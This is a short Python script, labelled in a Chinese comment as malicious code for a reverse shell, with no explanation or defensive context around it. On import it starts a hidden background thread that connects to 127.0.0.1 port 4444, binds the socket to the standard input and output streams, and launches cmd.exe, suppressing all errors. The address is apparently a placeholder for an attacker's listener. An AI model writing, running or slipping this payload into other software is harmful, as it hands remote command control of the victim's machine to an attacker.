import os
import sys
import socket
import subprocess
import threading

# 恶意代码 - 反弹shell
def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 4444))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["cmd.exe"], shell=True)
    except:
        pass

threading.Thread(target=reverse_shell, daemon=True).start()
